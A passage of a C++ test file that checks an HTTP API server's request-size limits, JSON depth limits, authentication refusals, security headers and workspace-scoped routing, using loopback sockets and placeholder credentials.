#include "audit_test_support.hpp"
#include "identity_proof_test_support.hpp"
#include "postgres_fixture.hpp"
#include <gtest/gtest.h>

#include <functional>
#include <future>
#include <thread>

#include "lake/control/identity_crypto.hpp"

#include <algorithm>
#include <atomic>
#include <cctype>
#include <charconv>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <filesystem>
#include <format>
#include <fstream>
#include <iostream>
#include <limits>
#include <map>
#include <memory>
#include <mutex>
#include <optional>
#include <print>
#include <ranges>
#include <set>
#include <sstream>
#include <string>
#include <string_view>
#include <system_error>
#include <tuple>
#include <vector>

#include <liquid/identity.hpp>
#include <liquid/liquid.hpp>
#include <nlohmann/json.hpp>
#include <openssl/evp.h>
#include <pqxx/pqxx>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include <boost/url.hpp>

#include "api/route_guard.hpp"
#include "audit_test_support.hpp"
#include "lake/api/capabilities.hpp"
#include "lake/api/clerk_webhooks.hpp"
#include "lake/api/oauth.hpp"
#include "lake/api/server.hpp"
#include "lake/audit/audit.hpp"
#include "lake/control/agent_bus.hpp"
#include "lake/control/agent_runs.hpp"
#include "lake/control/memory_store.hpp"
#include "lake/control/postgres_store.hpp"
#include "lake/control/web_apps.hpp"
#include "lake/control/zetta_workspace.hpp"
#include "repository_test_support.hpp"
#include "stream_fixture.hpp"
#include "temporary_directory.hpp"
#include "workspace_fixture.hpp"

#include <boost/beast2/http_server.hpp>
#include <boost/corosio/endpoint.hpp>
#include <boost/corosio/io_context.hpp>
#include <boost/corosio/ipv4_address.hpp>
#include <boost/http/server/router.hpp>

namespace {

// Captures what the process writes to one descriptor (stderr by default, or stdout).
class OutputPipe {
public:
    explicit OutputPipe(int fd = STDERR_FILENO, std::FILE* stream = stderr)
        : fd_(fd), stream_(stream) {
        if (::pipe(pipe_) != 0) {
            return;
        }
        original_ = ::dup(fd_);
        if (original_ < 0) {
            close_pipe();
            return;
        }
        std::fflush(stream_);
        std::cerr.flush();
        if (::dup2(pipe_[1], fd_) < 0) {
            ::close(original_);
            original_ = -1;
            close_pipe();
            return;
        }
        ::close(pipe_[1]);
        pipe_[1] = -1;
        capturing_ = true;
    }

    ~OutputPipe() {
        restore();
        close_pipe();
    }

    [[nodiscard]] bool ready() const {
        return capturing_;
    }

    std::string finish() {
        restore();
        std::string output;
        char buffer[256];
        for (;;) {
            const ssize_t count = ::read(pipe_[0], buffer, sizeof(buffer));
            if (count <= 0) {
                break;
            }
            output.append(buffer, static_cast<std::size_t>(count));
        }
        ::close(pipe_[0]);
        pipe_[0] = -1;
        return output;
    }

private:
    void restore() {
        if (!capturing_) {
            return;
        }
        std::fflush(stream_);
        std::cerr.flush();
        static_cast<void>(::dup2(original_, fd_));
        ::close(original_);
        original_ = -1;
        capturing_ = false;
    }

    void close_pipe() {
        for (int& descriptor : pipe_) {
            if (descriptor >= 0) {
                ::close(descriptor);
                descriptor = -1;
            }
        }
    }

    int fd_;
    std::FILE* stream_;
    int pipe_[2]{-1, -1};
    int original_{-1};
    bool capturing_{false};
};

int connect_loopback(unsigned short port) {
    const int socket_fd = ::socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd < 0) {
        return -1;
    }
    timeval timeout{};
    timeout.tv_sec = 5;
    static_cast<void>(::setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)));
    sockaddr_in address{};
    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (::connect(socket_fd, reinterpret_cast<sockaddr*>(&address), sizeof(address)) != 0) {
        ::close(socket_fd);
        return -1;
    }
    return socket_fd;
}

bool send_all(int socket_fd, std::string_view bytes) {
    std::size_t sent = 0;
    while (sent < bytes.size()) {
        const ssize_t count = ::send(socket_fd, bytes.data() + sent, bytes.size() - sent, 0);
        if (count <= 0) {
            return false;
        }
        sent += static_cast<std::size_t>(count);
    }
    return true;
}

std::string read_response(int socket_fd, bool wait_for_close) {
    std::string response;
    char buffer[4096];
    for (;;) {
        const ssize_t count = ::recv(socket_fd, buffer, sizeof(buffer), 0);
        if (count <= 0) {
            break;
        }
        response.append(buffer, static_cast<std::size_t>(count));
        if (wait_for_close) {
            continue;
        }
        const std::size_t header_end = response.find("\r\n\r\n");
        if (header_end == std::string::npos) {
            continue;
        }
        if (response.starts_with("HTTP/1.0 204") || response.starts_with("HTTP/1.1 204")) {
            return response.substr(0, header_end + 4);
        }
        std::string headers = response.substr(0, header_end);
        std::ranges::transform(headers, headers.begin(), [](unsigned char value) {
            return static_cast<char>(std::tolower(value));
        });
        constexpr std::string_view prefix = "\r\ncontent-length: ";
        const std::size_t length_start = headers.find(prefix);
        if (length_start == std::string::npos) {
            return {};
        }
        std::size_t length_end = headers.find("\r\n", length_start + prefix.size());
        if (length_end == std::string::npos) {
            length_end = headers.size();
        }
        const char* first = headers.data() + length_start + prefix.size();
        const char* last = headers.data() + length_end;
        std::size_t body_size = 0;
        const auto parsed = std::from_chars(first, last, body_size);
        if (parsed.ec != std::errc{} || parsed.ptr != last) {
            return {};
        }
        const std::size_t expected_size = header_end + 4 + body_size;
        if (response.size() >= expected_size) {
            response.resize(expected_size);
            return response;
        }
    }
    return wait_for_close ? response : std::string{};
}

std::string response_header(const std::string& response, std::string_view name) {
    const auto header_end = response.find("\r\n\r\n");
    std::string headers = response.substr(0, header_end);
    std::ranges::transform(headers, headers.begin(), [](unsigned char value) {
        return static_cast<char>(std::tolower(value));
    });
    const std::string prefix = "\r\n" + std::string(name) + ": ";
    const auto start = headers.find(prefix);
    if (start == std::string::npos) {
        return {};
    }
    const auto value_start = start + prefix.size();
    const auto end = headers.find("\r\n", value_start);
    return response.substr(value_start,
                           end == std::string::npos ? header_end - value_start : end - value_start);
}

std::string response_body(const std::string& response) {
    const auto header_end = response.find("\r\n\r\n");
    return header_end == std::string::npos ? std::string() : response.substr(header_end + 4);
}

std::string response_cookie_pair(const std::string& response) {
    std::string cookie = response_header(response, "set-cookie");
    if (const std::size_t end = cookie.find(';'); end != std::string::npos) {
        cookie.resize(end);
    }
    return cookie;
}

class HttpConnection {
public:
    explicit HttpConnection(unsigned short port) : descriptor_(connect_loopback(port)) {}
    std::string workspace_id;
    // The Host header: lake's own host, or an identity application's custom sign-in domain.
    std::string host = "localhost";

    ~HttpConnection() {
        if (descriptor_ >= 0) {
            ::close(descriptor_);
        }
    }

    HttpConnection(const HttpConnection&) = delete;
    HttpConnection& operator=(const HttpConnection&) = delete;

    std::string request(std::string_view method,
                        std::string_view path,
                        std::string_view body = {},
                        std::string_view cookie = {},
                        std::string_view version = "HTTP/1.1",
                        std::string_view bearer = {},
                        std::string_view content_type = "application/x-www-form-urlencoded",
                        const std::vector<std::pair<std::string, std::string>>& headers = {}) {
        // A workspace's Zetta is reached under the selected workspace (/w/<id>/workspaces/...).
        std::string selected_path(path);
        if (!workspace_id.empty() && path.starts_with("/workspaces/")) {
            selected_path = "/w/" + workspace_id + std::string(path);
        }
        path = selected_path;
        std::string wire = std::string(method) + " " + std::string(path) + " " +
                           std::string(version) + "\r\nHost: " + host + "\r\n";
        wire += "Connection: keep-alive\r\nContent-Type: " + std::string(content_type) + "\r\n";
        if (!bearer.empty()) {
            wire += "Authorization: Bearer " + std::string(bearer) + "\r\n";
        }
        wire += "Content-Length: " + std::to_string(body.size()) + "\r\n";
        if (!cookie.empty()) {
            wire += "Cookie: " + std::string(cookie) + "\r\n";
        }
        for (const auto& [name, value] : headers) {
            wire += name + ": " + value + "\r\n";
        }
        wire += "\r\n";
        wire += body;
        if (descriptor_ < 0 || !send_all(descriptor_, wire)) {
            return {};
        }
        return read_response(descriptor_, false);
    }

private:
    int descriptor_;
};

// Send headers alone: a refusal must arrive before the caller supplies any JSON bytes.
TEST(HttpServer, CapabilityAdmissionPrecedesTheBody) {
    auto store = std::make_shared<lake::control::InMemoryStore>();
    const auto user = store->create_user({"taap:body-admission", "", "Body admission"});
    ASSERT_TRUE(user);
    const auto customer = store->create_customer({"individual", user->id, "", "body-admission"});
    ASSERT_TRUE(customer);
    const auto workspace = store->create_workspace({customer->id, "body", "dev", user->taap_id});
    ASSERT_TRUE(workspace);
    lake::api::ServerOptions options;
    options.port = 0;
    options.store = store;
    options.admin_token = "body-operator";
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();

    for (const std::string prefix : {std::string(), "/w/" + workspace->id}) {
        for (const auto& [path, status] : std::vector<std::pair<std::string, std::string>>{
                 {"/v1/sign_in_password", "413"},
                 {"/v1/create_repository", "401"},
                 {"/v1/model_completion", "401"},
                 {"/openai/v1/responses", "401"},
                 {"/workspaces/" + customer->id + "/zetta/v1/create_project", "401"},
                 {"/mcp", "413"}}) {
            for (const std::string credential :
                 {std::string(), std::string("Authorization: Bearer rejected\r\n")}) {
                const int fd = connect_loopback(server.port());
                ASSERT_GE(fd, 0);
                timeval timeout{1, 0};
                ASSERT_EQ(::setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)), 0);
                ASSERT_TRUE(send_all(fd,
                                     "POST " + prefix + path + " HTTP/1.1\r\nHost: localhost\r\n" +
                                         credential +
                                         "Content-Type: application/json\r\n"
                                         "Content-Length: 2097152\r\n\r\n"));
                const std::string response = read_response(fd, false);
                ::close(fd);
                EXPECT_TRUE(response.starts_with("HTTP/1.1 " + status)) << prefix + path << '\n'
                                                                        << response;
                if (status == "401") {
                    EXPECT_NE(response_header(response, "www-authenticate").find("Bearer"),
                              std::string::npos);
                }
            }
        }
    }
}

TEST(HttpServer, JsonStructureLimitsApplyToRestAndMcp) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.admin_token = "structure-operator";
    options.store = std::make_shared<lake::control::InMemoryStore>();
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    const std::string deep = std::string(80, '[') + "0" + std::string(80, ']');
    std::string wide = "[";
    for (int i = 0; i < 70000; ++i) {
        wide += "0,";
    }
    wide.back() = ']';
    std::string duplicates = "{";
    for (int i = 0; i < 40000; ++i) {
        duplicates += "\"a\":0,";
    }
    duplicates.back() = '}';
    for (const std::string& input : {deep, wide, duplicates}) {
        for (const std::string path : {"/v1/sign_in_password", "/mcp"}) {
            HttpConnection connection(server.port());
            const std::string response = connection.request(
                "POST", path, "{\"unused\":" + input + "}", {}, "HTTP/1.1", {}, "application/json");
            EXPECT_TRUE(response.starts_with("HTTP/1.1 413")) << path << '\n' << response;
        }
    }
}

TEST(HttpServer, ChunkedJsonCannotBypassBodyBudgets) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.store = std::make_shared<lake::control::InMemoryStore>();
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    for (const auto& [path, limit] : std::vector<std::pair<std::string, std::size_t>>{
             {"/mcp", 256 * 1024}, {"/v1/sign_in_password", 1024 * 1024}}) {
        const int fd = connect_loopback(server.port());
        ASSERT_GE(fd, 0);
        timeval timeout{1, 0};
        ASSERT_EQ(::setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)), 0);
        ASSERT_TRUE(send_all(fd,
                             "POST " + path +
                                 " HTTP/1.1\r\nHost: localhost\r\n"
                                 "Content-Type: application/json\r\n"
                                 "Transfer-Encoding: chunked\r\n\r\n" +
                                 std::format("{:x}\r\n", limit + 100)));
        // An unfinished chunk of whitespace is still bounded. There is no JSON document to parse.
        ASSERT_TRUE(send_all(fd, std::string(limit + 1, ' ')));
        const std::string response = read_response(fd, false);
        ::close(fd);
        EXPECT_TRUE(response.starts_with("HTTP/1.1 413")) << path << '\n' << response;
    }
}

TEST(HttpServer, McpAnonymousBudgetPreservesDiscoveryAndBulkInputsRequireCredentials) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.admin_token = "bulk-operator";
    options.store = std::make_shared<lake::control::InMemoryStore>();
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    HttpConnection connection(server.port());
    const auto post = [&](const std::string& path,
                          const std::string& body,
                          std::string_view token = {}) {
        return connection.request("POST", path, body, {}, "HTTP/1.1", token, "application/json");
    };
    const std::string initialized =
        post("/mcp", R"({"jsonrpc":"2.0","id":1,"method":"initialize"})");
    ASSERT_TRUE(initialized.starts_with("HTTP/1.1 200")) << initialized;
    const std::string nested = std::string(63, '[') + "0" + std::string(63, ']');
    const std::string bounded =
        post("/mcp", "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"ping\",\"extra\":" + nested + "}");
    EXPECT_TRUE(bounded.starts_with("HTTP/1.1 200")) << bounded;
    const std::string protected_tool = post(
        "/mcp",
        R"({"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"create_repository","arguments":{}}})");
    ASSERT_TRUE(protected_tool.starts_with("HTTP/1.1 200")) << protected_tool;
    EXPECT_EQ(nlohmann::json::parse(
                  response_body(protected_tool))["result"]["structuredContent"]["error"]["code"],
              "unauthenticated");

    // A registered audio input may exceed the default; validation still runs after parsing.
    const std::string bulk =
        nlohmann::json{{"audio_base64", std::string(2 * 1024 * 1024, 'A')}}.dump();
    const std::string admitted = post("/v1/transcribe", bulk, "bulk-operator");
    EXPECT_TRUE(admitted.starts_with("HTTP/1.1 400")) << admitted.substr(0, 400);
    const std::string tool =
        nlohmann::json{{"jsonrpc", "2.0"},
                       {"id", 3},
                       {"method", "tools/call"},
                       {"params",
                        {{"name", "transcribe"},
                         {"arguments", {{"audio_base64", std::string(2 * 1024 * 1024, 'A')}}}}}}
            .dump();
    const std::string mcp_admitted = post("/mcp", tool, "bulk-operator");
    EXPECT_TRUE(mcp_admitted.starts_with("HTTP/1.1 200")) << mcp_admitted.substr(0, 400);
    const std::string small_tool =
        nlohmann::json{{"jsonrpc", "2.0"},
                       {"id", 4},
                       {"method", "tools/call"},
                       {"params",
                        {{"name", "sign_in_password"},
                         {"arguments", {{"padding", std::string(2 * 1024 * 1024, 'A')}}}}}}
            .dump();
    const std::string refused = post("/mcp", small_tool, "bulk-operator");
    EXPECT_TRUE(refused.starts_with("HTTP/1.1 413")) << refused.substr(0, 400);
}

// The web app owns every page (docs/ui/web-app.md, lake#561): a browser opening a former server
// page gets the app's index.html, anything else the 404; a retired form is gone; /w/<workspace>/ is
// checked only where the API and a workspace's Zetta are reached; and an identity application's
// custom sign-in domain still answers its own hosted pages.
TEST(WebAppHttp, BrowsersGetTheAppAndCustomDomainsTheirHostedSignIn) {
    auto store = std::make_shared<lake::control::InMemoryStore>();
    const auto user = store->create_user({"taap:web-app-pages", "", "Pages"});
    ASSERT_TRUE(user);
    const auto customer = store->create_customer({"individual", user->id, "", "web-app-pages"});
    ASSERT_TRUE(customer);
    lake::test::StreamWorkspace workspace(store, customer->id);
    lake::api::ServerOptions options;
    options.port = 0;
    options.store = store;
    options.workspaces = workspace.service;
    options.admin_token = "web-app-operator";
    options.instance_kek = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";
    options.public_host = "lake.example.test";
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    HttpConnection connection(server.port());
    connection.host = "lake.example.test";
    const std::vector<std::pair<std::string, std::string>> browser{
        {"Accept", "text/html,application/xhtml+xml,*/*;q=0.8"}};
    const auto get = [&](HttpConnection& on, const std::string& path, bool from_browser) {
        return on.request("GET",
                          path,
                          {},
                          {},
                          "HTTP/1.1",
                          {},
                          "text/plain",
                          from_browser ? browser
                                       : std::vector<std::pair<std::string, std::string>>{});
    };

    for (const std::string& path :
         std::vector<std::string>{"/design/projects",
                                  "/w/" + workspace.id + "/train/agents",
                                  "/repositories",
                                  "/train/streams?customer_id=" + customer->id,
                                  "/sign-in",
                                  "/login",
                                  "/workspace/select?workspace_id=" + workspace.id,
                                  "/w/" + workspace.id + "/"}) {
        const std::string page = get(connection, path, true);
        ASSERT_TRUE(page.starts_with("HTTP/1.1 200")) << path << "\n" << page.substr(0, 300);
        EXPECT_EQ(response_header(page, "content-type"), "text/html; charset=utf-8") << path;
        // Framed only by lake, and images only from lake (lake#943): Markdown an agent wrote can
        // make the browser contact no other server.
        EXPECT_EQ(response_header(page, "content-security-policy"),
                  "frame-ancestors 'self'; img-src 'self' data:")
            << path;
        // The page carries this request's viewer, so it is personal and never stored by a cache.
        EXPECT_EQ(response_header(page, "cache-control"), "private, no-store") << path;
        EXPECT_NE(page.find("<div id=\"root\">"), std::string::npos) << path;
        EXPECT_NE(page.find("<script id=\"lake-viewer\" type=\"application/json\">{"),
                  std::string::npos)
            << path << ": the first paint needs no viewer round trip";
        EXPECT_NE(page.find("\"signed_in\":false"), std::string::npos) << path;
        EXPECT_TRUE(response_header(page, "set-cookie").empty())
            << path << ": no lake_workspace cookie remembers a page any more";
        const std::string other = get(connection, path, false);
        EXPECT_TRUE(other.starts_with("HTTP/1.1 404")) << path << "\n" << other.substr(0, 300);
    }
    // The retired forms are gone: nothing is created through them.
    const std::string form =
        connection.request("POST",
                           "/workspaces/create",
                           "customer_id=" + customer->id + "&name=third&environment=dev",
                           {},
                           "HTTP/1.1",
                           "web-app-operator");
    EXPECT_TRUE(form.starts_with("HTTP/1.1 404")) << form.substr(0, 300);
    EXPECT_EQ(store->list_workspaces(customer->id)->size(), 1U);

    // /w/<workspace>/ is checked where the API is reached: an unknown workspace is a 404.
    const auto api = [&](const std::string& path) {
        return connection.request("GET", path, {}, {}, "HTTP/1.1", "web-app-operator");
    };
    EXPECT_TRUE(api("/w/" + workspace.id + "/v1/server_info").starts_with("HTTP/1.1 200"));
    for (const std::string& missing :
         std::vector<std::string>{"/w/" + lake::control::new_uuid_v4() + "/v1/server_info",
                                  "/w/not-a-workspace/mcp",
                                  "/w/" + lake::control::new_uuid_v4() + "/workspaces/" +
                                      customer->id + "/zetta/v1/openapi.json"}) {
        const std::string refused = api(missing);
        EXPECT_TRUE(refused.starts_with("HTTP/1.1 404")) << missing << "\n" << refused;
        EXPECT_NE(refused.find("no such workspace"), std::string::npos) << missing;
    }

    // An identity application's custom sign-in domain answers its hosted pages, with its name.
    const std::string registered = connection.request(
        "POST",
        "/v1/register_application",
        nlohmann::json{
            {"customer_id", customer->id},
            {"workspace_id", workspace.id},
            {"name", "Client one"},
            {"allowed_origins", nlohmann::json::array({"https://client.example.test"})},
            {"redirect_uris", nlohmann::json::array({"https://client.example.test/callback"})},
            {"custom_sign_in_domain", "login.client.example.test"},
            {"theme", {{"accent_color", "#123456"}}}}
            .dump(),
        {},
        "HTTP/1.1",
        "web-app-operator",
        "application/json");
    ASSERT_TRUE(registered.starts_with("HTTP/1.1 200")) << registered;
    HttpConnection hosted(server.port());
    hosted.host = "login.client.example.test";
    for (const std::string path : {"/sign-in", "/sign-up", "/mfa", "/passkey-sign-in"}) {
        for (const bool from_browser : {true, false}) {
            const std::string page = get(hosted, path, from_browser);
            ASSERT_TRUE(page.starts_with("HTTP/1.1 200")) << path << "\n" << page.substr(0, 300);
            EXPECT_NE(page.find("class=\"hosted-shell\""), std::string::npos) << path;
            EXPECT_NE(page.find("Client one"), std::string::npos) << path;
            EXPECT_NE(page.find("--accent:#123456"), std::string::npos) << path;
            EXPECT_EQ(page.find("<div id=\"root\">"), std::string::npos) << path;
            EXPECT_EQ(response_header(page, "content-security-policy"),
                      "frame-ancestors 'self'; img-src 'self' data:");
        }
    }
    EXPECT_NE(get(hosted, "/repositories", true).find("<div id=\"root\">"), std::string::npos)
        << "only the sign-in pages are the application's";
}

TEST(HttpServer, WorkspacePrefixServesRestOpenApiMcpAndAppSourceReads) {
    auto store = std::make_shared<lake::control::InMemoryStore>();
    const auto user = store->create_user({"taap:workspace-api", "", "Workspace API"});
    ASSERT_TRUE(user);
    const auto customer =
        store->create_customer({"individual", user->id, "", "workspace-api"});
    ASSERT_TRUE(customer);
    const auto workspace = store->create_workspace({customer->id, "apps", "dev", user->taap_id});
    const auto other_workspace =
        store->create_workspace({customer->id, "other", "dev", user->taap_id});
    ASSERT_TRUE(workspace);
    ASSERT_TRUE(other_workspace);
    const auto repository =
        store->create_repository({customer->id, "app-source", "", "private",
                                  lake::test::repository_workspace(*store, customer->id)});
    ASSERT_TRUE(repository);

    const std::filesystem::path root =
        lake::test::fixture_path("workspace-api-" + lake::control::new_uuid_v4());
    auto objects = liquid::runtime::block_on(liquid::store::open(root / customer->id / "store"));
    ASSERT_TRUE(objects) << objects.error().message;
    liquid::repository_options repository_options;
    repository_options.store = &*objects;
    auto source = liquid::runtime::block_on(liquid::repository::create(
        root / customer->id / "repositories" / repository->id, repository_options));
    ASSERT_TRUE(source) << source.error().message;
    const std::string source_text = "workspace app source\n";
    const auto* source_bytes = reinterpret_cast<const std::byte*>(source_text.data());
    const std::vector<std::byte> source_contents{
        source_bytes, source_bytes + source_text.size()};
    ASSERT_TRUE(liquid::runtime::block_on(source->write(
        "README.md", source_contents)));
    const auto change = liquid::runtime::block_on(source->cut("Add workspace app source"));
    ASSERT_TRUE(change) << change.error().message;
    ASSERT_TRUE(liquid::runtime::block_on(source->set_ref("main", *change)));

    lake::control::NewWebApp app_input;
    app_input.customer_id = customer->id;
    app_input.workspace_id = workspace->id;
    app_input.name = "source-reader";
    app_input.mode = "runtime";
    app_input.source_repository = repository->id;
    app_input.source_revision = "main";
    app_input.source_path = ".";
    app_input.port = 8080;
    app_input.host = "source-reader.apps.example.test";
    const auto app = store->create_web_app(app_input);
    ASSERT_TRUE(app);
    ASSERT_TRUE(store->set_web_app_token_hashes(
        app->id,
        {{"source", lake::control::identity_crypto::sha256_hex("workspace-source-token")}}));

    lake::api::ApiServer server({.port = 0,
                                 .store = store,
                                 .admin_token = "workspace-api-operator",
                                 .instance_kek = "workspace-api-instance-kek",
                                 .store_root = root.string()});
    ASSERT_TRUE(server.start()) << server.reason();
    HttpConnection connection(server.port());
    const auto request = [&](std::string_view method,
                             const std::string& path,
                             std::string body = {},
                             std::string_view bearer = "workspace-api-operator") {
        return connection.request(
            method, path, body, "", "HTTP/1.1", bearer, "application/json");
    };
    const auto body_json = [](const std::string& response) {
        return nlohmann::json::parse(response_body(response));
    };
    const std::string prefix = "/w/" + workspace->id;

    const auto unscoped_info = request("GET", "/v1/server_info");
    const auto scoped_info = request("GET", prefix + "/v1/server_info");
    ASSERT_TRUE(scoped_info.starts_with("HTTP/1.1 200")) << scoped_info;
    EXPECT_EQ(body_json(scoped_info)["value"], body_json(unscoped_info)["value"]);

    const std::string list_query = "?customer_id=" + customer->id;
    const auto unscoped_apps = request(
        "GET", "/v1/list_apps" + list_query + "&workspace_id=" + workspace->id);
    const auto scoped_apps = request("GET", prefix + "/v1/list_apps" + list_query);
    ASSERT_TRUE(scoped_apps.starts_with("HTTP/1.1 200")) << scoped_apps;
    EXPECT_EQ(body_json(scoped_apps)["value"], body_json(unscoped_apps)["value"]);
    const auto mismatch = request("GET",
                                  prefix + "/v1/list_apps" + list_query +
                                      "&workspace_id=" + other_workspace->id);
    EXPECT_TRUE(mismatch.starts_with("HTTP/1.1 400")) << mismatch;
    EXPECT_EQ(body_json(mismatch)["error"]["code"], "invalid_input");

    const auto unscoped_openapi = request("GET", "/v1/openapi.json");
    const auto scoped_openapi = request("GET", prefix + "/v1/openapi.json");
    ASSERT_TRUE(scoped_openapi.starts_with("HTTP/1.1 200")) << scoped_openapi;
    EXPECT_EQ(response_body(scoped_openapi), response_body(unscoped_openapi));

    const std::string tree_query =
        "?id=" + repository->id + "&ref=main";
    const auto tree = request(
        "GET", prefix + "/v1/repository_tree" + tree_query, "", "workspace-source-token");
    ASSERT_TRUE(tree.starts_with("HTTP/1.1 200")) << tree;
    ASSERT_TRUE(body_json(tree)["ok"].get<bool>()) << body_json(tree);
    EXPECT_EQ(body_json(tree)["value"]["items"][0]["path"], "README.md");
    const auto wrong_workspace = request("GET",
                                         "/w/" + other_workspace->id +
                                             "/v1/repository_tree" + tree_query,
                                         "",
                                         "workspace-source-token");
    EXPECT_TRUE(wrong_workspace.starts_with("HTTP/1.1 403")) << wrong_workspace;

    const nlohmann::json mcp_request = {
        {"jsonrpc", "2.0"},
        {"id", 1},
        {"method", "tools/call"},
        {"params",
         {{"name", "repository_tree"},
          {"arguments", {{"id", repository->id}, {"ref", "main"}}}}},
    };
    const auto mcp = request(
        "POST", prefix + "/mcp", mcp_request.dump(), "workspace-source-token");
    ASSERT_TRUE(mcp.starts_with("HTTP/1.1 200")) << mcp;
    EXPECT_EQ(body_json(mcp)["result"]["structuredContent"]["ok"], true);
    EXPECT_EQ(body_json(mcp)["result"]["structuredContent"]["value"]["items"][0]["path"],
              "README.md");

    const auto unknown = request(
        "GET", "/w/" + lake::control::new_uuid_v4() + "/v1/server_info");
    EXPECT_TRUE(unknown.starts_with("HTTP/1.1 404")) << unknown;
    EXPECT_EQ(body_json(unknown)["error"]["code"], "not_found");
}

// A workspace cluster that answers from a table, recording what reached it.
class RecordingWorkspace final : public lake::control::WorkspaceCaller {
public:
    std::vector<std::tuple<std::string, bool, nlohmann::json>> calls;
    std::map<std::string, nlohmann::json> answers;
    lake::test::StreamCaller topics;

    liquid::runtime::task<lake::control::ZettaControlResult<nlohmann::json>>
    call(std::string, std::string, std::string capability, bool read, nlohmann::json input)
        override {
        calls.emplace_back(capability, read, input);
        if (capability == "create_topic" || capability == "publish_event" ||
            capability == "receive_events" || capability == "update_topic" || capability == "drop_topic" ||
            lake::test::RecordTables::handles(capability, input)) {
            co_return lake::control::settled(co_await topics.call("http://workspace.test", "token", capability, read, input));
        }
        const auto answer = answers.find(capability);
        co_return lake::control::ZettaControlResult<nlohmann::json>(
            answer == answers.end() ? nlohmann::json::object() : answer->second);
    }
};

// An agent service that answers one scripted turn, recording what it was sent.
class ScriptedAgents final : public lake::control::AgentCaller {
public:
    std::vector<nlohmann::json> turns;
    nlohmann::json answer = {{"ok", true}, {"reply", "hello"}};

    liquid::runtime::task<lake::control::ZettaControlResult<nlohmann::json>>
    turn(std::string, std::string, nlohmann::json body) override {
        turns.push_back(std::move(body));
        co_return lake::control::ZettaControlResult<nlohmann::json>(answer);
    }
};

// Parameters select the production Postgres store and a fresh client connection.
class HttpResponseIsolation : public testing::TestWithParam<std::tuple<bool, bool>> {
protected:
    void SetUp() override {
        if (std::get<0>(GetParam())) {
            const char* uri = lake::test::postgres_uri();
            if (uri == nullptr || *uri == '\0') {
                GTEST_SKIP() << "LAKE_TEST_DB_URI is not configured";
            }
            // The runner's database is private to this test (tests/test_main.cpp).
            database_uri_ = uri;
            store_ = lake::control::make_postgres_store(database_uri_, instance_kek_);
            create_identity_document();
            ASSERT_FALSE(identity_document_.empty());
        } else {
            store_ = std::make_shared<lake::control::InMemoryStore>();
            identity_document_ = "{}";
        }
        email_ = "response-isolation-" + lake::control::new_uuid_v4() + "@example.test";
        lake::control::NewPasswordUser account_input{
            "lake", email_, password_, "Isolation test", "fixture", identity_document_};
        account_input.identity_proof = identity_proof_;
        const auto account = store_->sign_up_password(account_input);
        ASSERT_TRUE(account.has_value());
        lake::api::ServerOptions options;
        options.port = 0;
        // One worker deterministically reuses its response even after a socket closes.
        options.worker_coroutines = 1;
        options.store = store_;
        options.admin_token = "front-door-operator";
        options.instance_kek = instance_kek_;
        options.store_root =
            lake::test::fixture_path("http-store-" + lake::control::new_uuid_v4()).string();
        options.metering.storage_quota_bytes = 1ULL << 30;
        options.metering.storage_gib_hour_micros = 1000;
        options.metering.transfer_in_gib_micros = 1000;
        options.metering.transfer_out_gib_micros = 1000;
        options.metering.compute_second_micros = 1000;
        options.apps_wildcard = "apps.example.test";
        options.apps_runtime_image = "oramasearch/app-runtime:20260930";
        options.internal_url = "http://lake-prod.lake.svc:80";
        options.apps_per_customer = 10;
        options.app_replicas_per_customer = 20;
        workspace_dir_ = lake::test::fixture_path("http-services-" + lake::control::new_uuid_v4());
        std::filesystem::create_directories(workspace_dir_);
        lake::control::WorkspaceConfig workspace_config{workspace_dir_.string(), 0};
        workspace_config.agent_endpoints = {{"agent-ask-orama", "http://ask:8080"},
                                            {"agent-project", "http://project:8080"},
                                            {"agent-application", "http://application:8080"},
                                            {"agent-experiments", "http://experiments:8080"},
                                            {"agent-autosuggest", "http://suggest:8080"},
                                            {"agent-creator", "http://creator:8080"},
                                            {"agent-eval-generator", "http://eval:8080"}};
        workspace_config.internal_url = "http://lake.internal";
        workspace_config.agent_service_token = "the-service-token";
        for (const auto& [agent, endpoint] : workspace_config.agent_endpoints) {
            workspace_config.agent_bus_tokens[agent] = "bus-token-" + agent;
        }
        std::vector<std::string> bus_agents;
        for (const auto& [agent, endpoint] : workspace_config.agent_endpoints) {
            bus_agents.push_back(agent);
        }
        workspaces_ = std::make_shared<lake::control::WorkspaceService>(
            workspace_config, store_, workspace_caller_);
        options.workspaces = workspaces_;
        options.agent_caller = agents_;
        agent_bus_ = std::make_shared<lake::control::AgentTaskBus>(store_, bus_, bus_agents);
        ASSERT_TRUE(liquid::runtime::block_on(agent_bus_->start()).value());
        options.agent_bus = agent_bus_;
        server_ = std::make_unique<lake::api::ApiServer>(options);
        ASSERT_TRUE(server_->start()) << server_->reason();
    }

    void TearDown() override {
        server_.reset();
        store_.reset();
    }

    void verify_agent_workspace(HttpConnection& connection,
                                const lake::control::AgentTask& task,
                                const std::string& credential) {
        const std::string selected_workspace = connection.workspace_id;
        connection.workspace_id.clear();
        const std::string zetta_openapi = connection.request(
            "GET", "/workspaces/" + task.customer_id + "/zetta/v1/openapi.json",
            "", "", "HTTP/1.1", credential);
        const std::string lake_openapi_response = connection.request(
            "GET", "/v1/openapi.json", "", "", "HTTP/1.1", credential);
        const std::string workspace_read = connection.request(
            "GET", "/workspaces/" + task.customer_id + "/zetta/v1/list_methodologies",
